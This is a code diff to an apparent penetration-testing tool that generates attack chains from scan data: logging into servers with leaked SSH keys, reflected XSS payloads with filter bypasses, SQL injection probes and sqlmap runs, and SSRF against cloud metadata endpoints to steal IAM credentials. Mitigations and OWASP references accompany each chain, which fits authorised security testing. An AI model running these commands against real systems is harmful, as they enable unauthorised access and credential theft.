@@ -245,6 +245,28 @@ def detect_secret_exploitation(scan_data: dict[str, Any]) -> list[AttackChain]:
                            "JSON response with charge data = CRITICAL financial exposure" if is_secret else "Publishable keys have limited access — check if secret key is nearby",
                            "sk_live_ keys can charge cards and read all data. sk_test_ keys access test mode only — lower severity"),
             ])
+        elif any(kw in secret_type.lower() for kw in ("rsa", "ssh", "private key", "private_key", "pem")) or "BEGIN" in matched_raw[:30]:
+            # RSA / SSH Private Key — specific validation
+            steps.extend([
+                AttackStep(2, "Extract the full PEM key block",
+                           f"# Locate the full key in the source file:\ngrep -A 30 'BEGIN' {display_location}\n# Save the full block (-----BEGIN ... -----END) to a file:\n# key.pem",
+                           "grep",
+                           "Full PEM block from -----BEGIN to -----END-----",
+                           "RSA keys are multi-line. You need the entire block, not just the first line"),
+                AttackStep(3, "Check if this is a known test/example key",
+                           "# Compare the key fingerprint against known test keys:\nssh-keygen -lf key.pem 2>/dev/null\n# Known test key fingerprints (skip if matches):\n#   SHA256:jE4gM... = Metasploitable default\n#   SHA256:W2Fh4... = DVWA example key\n# If fingerprint is unique → likely a real leaked key",
+                           "ssh-keygen",
+                           "Unique fingerprint = potentially real key. Known test fingerprint = false positive"),
+                AttackStep(4, "Determine what the key authenticates to",
+                           f"# Check context around the key in {display_location}:\ngrep -B 10 'BEGIN' {display_location} | grep -iE '(host|server|ip|user|root|deploy|prod|staging)'\n# Look for associated username, hostname, or IP address",
+                           "grep",
+                           "Found associated host/user = try SSH connection next"),
+                AttackStep(5, "Test SSH authentication (if host found)",
+                           "chmod 600 key.pem\nssh -i key.pem -o StrictHostKeyChecking=no -o ConnectTimeout=5 <user>@<host> 'whoami; hostname; id' 2>&1",
+                           "ssh",
+                           "Successful login = CRITICAL — full server compromise",
+                           "Replace <user> and <host> with values found in step 4. Common users: root, ubuntu, deploy, ec2-user"),
+            ])
         elif "api" in secret_type.lower() or "key" in secret_type.lower():
             steps.extend([
                 AttackStep(2, "Identify the API service from key format",
@@ -938,6 +960,309 @@ def detect_github_leaks(scan_data: dict[str, Any]) -> list[AttackChain]:
 
 
 # ---------------------------------------------------------------------------
+# Pattern 14: XSS Candidates — Reflected Parameters
+# ---------------------------------------------------------------------------
+def detect_xss_candidates(scan_data: dict[str, Any]) -> list[AttackChain]:
+    """Find URLs with reflected parameters that may be vulnerable to XSS."""
+    chains: list[AttackChain] = []
+    endpoints_data = scan_data.get("endpoints", {})
+    all_endpoints = endpoints_data.get("endpoints", [])
+
+    # XSS-prone parameter names
+    XSS_PARAMS = {
+        "q", "search", "query", "s", "keyword", "term", "name", "value",
+        "input", "text", "msg", "message", "comment", "body", "title",
+        "content", "data", "html", "callback", "jsonp", "error", "err",
+    }
+
+    xss_targets = []
+    for ep in all_endpoints:
+        url = ep if isinstance(ep, str) else ep.get("url", "")
+        url_lower = url.lower()
+        for param in XSS_PARAMS:
+            if f"{param}=" in url_lower or f"&{param}=" in url_lower:
+                xss_targets.append({"url": url, "param": param})
+                break
+
+    if not xss_targets:
+        return chains
+
+    # Group by param to avoid duplicate chains
+    seen_params: set[str] = set()
+    for target in xss_targets[:10]:  # Cap at 10
+        param = target["param"]
+        if param in seen_params:
+            continue
+        seen_params.add(param)
+        url = target["url"]
+        chain_id = f"chain-xss-{hashlib.md5(f'{param}-{url[:50]}'.encode()).hexdigest()[:8]}"
+
+        chains.append(AttackChain(
+            id=chain_id,
+            title=f"Reflected XSS via '{param}' Parameter",
+            severity="medium",
+            confidence=0.4,
+            category="xss",
+            description=(
+                f"The parameter `{param}` appears in URL `{url[:80]}...` and is commonly "
+                f"reflected in page output. If input is not sanitized, this could allow "
+                f"stored or reflected XSS leading to session hijacking or credential theft."
+            ),
+            target_host=url,
+            affected_assets=[t["url"] for t in xss_targets if t["param"] == param][:5],
+            prerequisites=[
+                f"Parameter '{param}' accepts user input",
+                "Value is reflected in HTML response without encoding",
+            ],
+            steps=[
+                AttackStep(1, f"Test basic reflection in '{param}' parameter",
+                           f"curl -s '{url.split('?')[0]}?{param}=sc0utxTEST123' | grep -i 'sc0utxTEST123'",
+                           "curl",
+                           "If the string appears in the response HTML → reflection confirmed",
+                           "If not reflected, try POST method or different encoding"),
+                AttackStep(2, "Test HTML injection",
+                           f"curl -s '{url.split('?')[0]}?{param}=<b>sc0utx</b>' | grep -i '<b>sc0utx</b>'",
+                           "curl",
+                           "If <b> tags render → HTML injection confirmed, XSS likely"),
+                AttackStep(3, "Test JavaScript execution (harmless payload)",
+                           f"# Open in browser with DevTools console open:\n# {url.split('?')[0]}?{param}='\"><img src=x onerror=alert(document.domain)>\n# OR use a headless check:\ncurl -s '{url.split('?')[0]}?{param}=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E' | grep -i 'onerror'",
+                           "curl/browser",
+                           "Alert fires or payload appears unencoded → CONFIRMED XSS"),
+                AttackStep(4, "Check for WAF/filter bypass",
+                           "# If basic payloads are blocked, try:\n# Case variation: <ScRiPt>alert(1)</sCrIpT>\n# Event handlers: <svg/onload=alert(1)>\n# Encoding: %3Csvg%20onload%3Dalert(1)%3E\n# Double encoding: %253Csvg%2520onload%253Dalert(1)%253E",
+                           "browser",
+                           "Bypassed filter = report with bypass details"),
+            ],
+            tools_needed=["curl", "browser"],
+            references=[
+                "https://owasp.org/www-community/attacks/xss/",
+                "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet",
+            ],
+            mitigation=(
+                "1. **HTML-encode all output** — use context-aware encoding (HTML, JS, URL, CSS)\n"
+                "2. **Implement Content-Security-Policy** — restrict inline script execution\n"
+                "3. **Use HTTPOnly cookies** — prevent session theft via document.cookie\n"
+                "4. **Input validation** — whitelist expected characters for each parameter\n"
+                "5. **Use modern frameworks** — React, Vue, Angular auto-escape by default"
+            ),
+        ))
+
+    return chains
+
+
+# ---------------------------------------------------------------------------
+# Pattern 15: SQLi Candidates — Error-Based Detection
+# ---------------------------------------------------------------------------
+def detect_sqli_candidates(scan_data: dict[str, Any]) -> list[AttackChain]:
+    """Find URLs with parameters that may be vulnerable to SQL injection."""
+    chains: list[AttackChain] = []
+    endpoints_data = scan_data.get("endpoints", {})
+    all_endpoints = endpoints_data.get("endpoints", [])
+
+    # SQLi-prone parameter names
+    SQLI_PARAMS = {
+        "id", "user_id", "uid", "pid", "item", "product", "category",
+        "cat", "page", "order", "sort", "col", "dir", "filter",
+        "type", "action", "view", "report", "file", "doc", "num",
+    }
+
+    sqli_targets = []
+    for ep in all_endpoints:
+        url = ep if isinstance(ep, str) else ep.get("url", "")
+        url_lower = url.lower()
+        for param in SQLI_PARAMS:
+            if f"{param}=" in url_lower:
+                sqli_targets.append({"url": url, "param": param})
+                break
+
+    if not sqli_targets:
+        return chains
+
+    seen_params: set[str] = set()
+    for target in sqli_targets[:8]:
+        param = target["param"]
+        if param in seen_params:
+            continue
+        seen_params.add(param)
+        url = target["url"]
+        chain_id = f"chain-sqli-{hashlib.md5(f'{param}-{url[:50]}'.encode()).hexdigest()[:8]}"
+
+        chains.append(AttackChain(
+            id=chain_id,
+            title=f"Potential SQL Injection via '{param}' Parameter",
+            severity="high",
+            confidence=0.35,
+            category="injection",
+            description=(
+                f"The parameter `{param}` in `{url[:80]}...` accepts numeric or string input "
+                f"that is commonly passed to database queries. If unsanitized, this could allow "
+                f"SQL injection enabling data exfiltration, authentication bypass, or RCE."
+            ),
+            target_host=url,
+            affected_assets=[t["url"] for t in sqli_targets if t["param"] == param][:5],
+            prerequisites=[
+                f"Parameter '{param}' is passed to a database query",
+                "No parameterized queries / ORM in use",
+            ],
+            steps=[
+                AttackStep(1, "Test for error-based SQL injection",
+                           f"# Inject a single quote and look for SQL errors:\ncurl -s \"{url.split('?')[0]}?{param}=1'\" | grep -iE '(sql|syntax|mysql|postgres|sqlite|oracle|mssql|error|warning|ORA-|PG::|SQLSTATE)'",
+                           "curl",
+                           "SQL error message in response = CONFIRMED SQL injection point",
+                           "Common errors: 'You have an error in your SQL syntax', 'unterminated quoted string'"),
+                AttackStep(2, "Test boolean-based blind SQLi",
+                           f"# Compare responses for TRUE vs FALSE conditions:\ncurl -s \"{url.split('?')[0]}?{param}=1 AND 1=1\" -o /tmp/sqli_true.txt\ncurl -s \"{url.split('?')[0]}?{param}=1 AND 1=2\" -o /tmp/sqli_false.txt\ndiff /tmp/sqli_true.txt /tmp/sqli_false.txt | head -20",
+                           "curl/diff",
+                           "Different responses = boolean-based blind SQLi confirmed"),
+                AttackStep(3, "Test time-based blind SQLi",
+                           f"# Inject a sleep command and measure response time:\ntime curl -s \"{url.split('?')[0]}?{param}=1; SELECT SLEEP(5)--\" > /dev/null\n# OR for PostgreSQL:\ntime curl -s \"{url.split('?')[0]}?{param}=1; SELECT pg_sleep(5)--\" > /dev/null",
+                           "curl/time",
+                           "5+ second delay = time-based blind SQLi confirmed"),
+                AttackStep(4, "Automate with sqlmap (if confirmed)",
+                           f"sqlmap -u \"{url}\" -p {param} --batch --level 3 --risk 2 --dbs",
+                           "sqlmap",
+                           "Database names enumerated = report with full scope",
+                           "Only run sqlmap if manual tests confirm injection. Use --batch for non-interactive mode"),
+            ],
+            tools_needed=["curl", "sqlmap"],
+            references=[
+                "https://owasp.org/www-community/attacks/SQL_Injection",
+                "https://portswigger.net/web-security/sql-injection/cheat-sheet",
+            ],
+            mitigation=(
+                "1. **Use parameterized queries** — never concatenate user input into SQL\n"
+                "2. **Use an ORM** — SQLAlchemy, Prisma, Sequelize handle escaping\n"
+                "3. **Input validation** — whitelist expected types (integer for IDs, etc.)\n"
+                "4. **Least privilege** — DB user should have minimal permissions\n"
+                "5. **WAF rules** — block common SQLi patterns as defense-in-depth"
+            ),
+        ))
+
+    return chains
+
+
+# ---------------------------------------------------------------------------
+# Pattern 16: SSRF via Cloud Metadata — Cloud Asset Exploitation
+# ---------------------------------------------------------------------------
+def detect_ssrf_cloud_metadata(scan_data: dict[str, Any]) -> list[AttackChain]:
+    """If cloud assets detected + URL parameters exist, generate SSRF metadata chains."""
+    chains: list[AttackChain] = []
+
+    cloud_data = scan_data.get("cloud", {})
+    endpoints_data = scan_data.get("endpoints", {})
+    all_endpoints = endpoints_data.get("endpoints", [])
+
+    # Check if we have cloud assets
+    cloud_assets = cloud_data.get("assets", [])
+    cloud_providers = cloud_data.get("providers", [])
+    has_cloud = bool(cloud_assets or cloud_providers)
+
+    if not has_cloud:
+        # Also check probe data for cloud headers
+        probe_data = scan_data.get("probe", {})
+        alive = probe_data.get("alive", [])
+        for host_info in alive[:20]:
+            headers = {}
+            if isinstance(host_info, dict):
+                headers = host_info.get("headers", {})
+            for hdr_name in headers:
+                if any(cloud in hdr_name.lower() for cloud in ("x-amz", "x-goog", "x-ms-", "x-azure")):
+                    has_cloud = True
+                    break
+            if has_cloud:
+                break
+
+    if not has_cloud:
+        return chains
+
+    # Find URL-accepting parameters
+    SSRF_PARAMS = {
+        "url", "uri", "path", "dest", "redirect", "return", "next",
+        "site", "html", "data", "reference", "ref", "link", "src",
+        "image", "img", "load", "page", "feed", "to", "out", "view",
+        "dir", "show", "navigation", "open", "file", "val", "validate",
+        "domain", "callback", "return_path", "target", "proxy", "fetch",
+    }
+
+    ssrf_targets = []
+    for ep in all_endpoints:
+        url = ep if isinstance(ep, str) else ep.get("url", "")
+        url_lower = url.lower()
+        for param in SSRF_PARAMS:
+            if f"{param}=" in url_lower:
+                ssrf_targets.append({"url": url, "param": param})
+                break
+
+    if not ssrf_targets:
+        return chains
+
+    # Generate one chain for the best target
+    best = ssrf_targets[0]
+    url = best["url"]
+    param = best["param"]
+    chain_id = f"chain-ssrf-cloud-{hashlib.md5(f'{param}-{url[:50]}'.encode()).hexdigest()[:8]}"
+
+    chains.append(AttackChain(
+        id=chain_id,
+        title=f"SSRF → Cloud Metadata Exfiltration via '{param}' Parameter",
+        severity="critical",
+        confidence=0.45,
+        category="ssrf",
+        description=(
+            f"Cloud infrastructure detected (AWS/GCP/Azure) and the parameter `{param}` "
+            f"in `{url[:80]}...` accepts URL-like input. If the server fetches user-supplied "
+            f"URLs without validation, an attacker can access the cloud metadata endpoint "
+            f"(169.254.169.254) to steal IAM credentials, leading to full cloud account compromise."
+        ),
+        target_host=url,
+        affected_assets=[t["url"] for t in ssrf_targets][:5] + [str(a) if isinstance(a, str) else a.get("asset", "") for a in cloud_assets[:3]],
+        prerequisites=[
+            f"Parameter '{param}' accepts URL/path input",
+            "Server fetches the URL server-side (not client-side redirect)",
+            "Cloud metadata endpoint (169.254.169.254) is reachable from the server",
+        ],
+        steps=[
+            AttackStep(1, "Test if the parameter fetches external URLs",
+                       f"# Use a Burp Collaborator or webhook.site URL:\ncurl -s '{url.split('?')[0]}?{param}=https://webhook.site/<your-id>'\n# Check webhook.site for incoming request from the target server",
+                       "curl",
+                       "Incoming request on your webhook = server-side fetch confirmed",
+                       "If no callback, try: http://your-server:8080/ and listen with nc -lvp 8080"),
+            AttackStep(2, "Probe AWS metadata endpoint (IMDSv1)",
+                       f"curl -s '{url.split('?')[0]}?{param}=http://169.254.169.254/latest/meta-data/'\n# If blocked, try bypasses:\ncurl -s '{url.split('?')[0]}?{param}=http://[::ffff:169.254.169.254]/latest/meta-data/'\ncurl -s '{url.split('?')[0]}?{param}=http://0xA9FEA9FE/latest/meta-data/'",
+                       "curl",
+                       "Metadata response (ami-id, instance-id, etc.) = SSRF CONFIRMED"),
+            AttackStep(3, "Steal IAM credentials from metadata",
+                       f"# Get the IAM role name:\ncurl -s '{url.split('?')[0]}?{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/'\n# Then fetch the actual credentials:\ncurl -s '{url.split('?')[0]}?{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>'",
+                       "curl",
+                       "JSON with AccessKeyId, SecretAccessKey, Token = CRITICAL — full cloud compromise",
+                       "These are temporary credentials. Use them immediately with: aws sts get-caller-identity"),
+            AttackStep(4, "Try GCP metadata (if not AWS)",
+                       f"curl -s '{url.split('?')[0]}?{param}=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'",
+                       "curl",
+                       "OAuth token in response = GCP SSRF confirmed"),
+            AttackStep(5, "Try Azure metadata (if not AWS/GCP)",
+                       f"curl -s '{url.split('?')[0]}?{param}=http://169.254.169.254/metadata/instance?api-version=2021-02-01' -H 'Metadata: true'",
+                       "curl",
+                       "Instance metadata JSON = Azure SSRF confirmed"),
+        ],
+        tools_needed=["curl", "browser", "aws-cli"],
+        references=[
+            "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
+            "https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf",
+        ],
+        mitigation=(
+            "1. **Block internal IPs** — deny requests to 169.254.0.0/16, 10.0.0.0/8, 172.16.0.0/12\n"
+            "2. **Use IMDSv2** — requires session tokens, blocks simple SSRF\n"
+            "3. **Allowlist URLs** — only permit requests to known external domains\n"
+            "4. **Disable URL parameters** — use IDs/slugs instead of full URLs\n"
+            "5. **Network segmentation** — metadata endpoint should not be reachable from web tier"
+        ),
+    ))
+
+    return chains
+
+
+# ---------------------------------------------------------------------------
 # MASTER PATTERN REGISTRY
 # ---------------------------------------------------------------------------
 ALL_PATTERNS = [
@@ -954,4 +1279,8 @@ ALL_PATTERNS = [
     detect_cloud_misconfig,
     detect_api_exposure,
     detect_github_leaks,
+    detect_xss_candidates,
+    detect_sqli_candidates,
+    detect_ssrf_cloud_metadata,
 ]
+
